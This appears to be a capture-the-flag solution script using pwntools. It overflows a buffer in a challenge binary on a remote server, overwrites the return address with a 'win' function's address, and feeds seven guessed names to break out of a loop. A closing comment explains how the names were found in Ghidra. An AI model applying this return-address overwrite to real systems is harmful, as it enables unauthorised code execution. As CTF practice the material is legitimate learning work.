#! /usr/bin/env python3

from pwn import *

# 0x401301 Immediate after scanf
# 0x4013df When printing number correct after success
# 0x401422 Prining final success message
# 0x401216 Win Function

# p = gdb.debug('./chall', '''
# b main
# b *0x401422
# ''')

p = remote('164.92.176.247', 5002)

payload  = b'a' * 40
payload += p64(0x401216)
payload += b'b' * (100 - len(payload))

p.sendline(payload)
p.sendline(b'Sonbol')
p.sendline(b'Sabzeh')
p.sendline(b'Seer')
p.sendline(b'Seeb')
p.sendline(b'Senjed')
p.sendline(b'Samanu')
p.sendline(b'Serkeh')

p.interactive()


'''
This one was relatively easy to see where the overflow initially
was.  The difficulty is the binary purposefully puts you in an
infinite loop until you guess all of the 7 names seen here.  I
found these pretty easily in Ghidra, the binary was not stripped
so I just clicked on the array "Seen" and it showed them all.
Finally, I realized I had to just make the 7 correct guesses and
then the function would exit.  At that point RIP is overwritten
so I just put in the address of the win variable and bobs your
uncle as they say.
'''
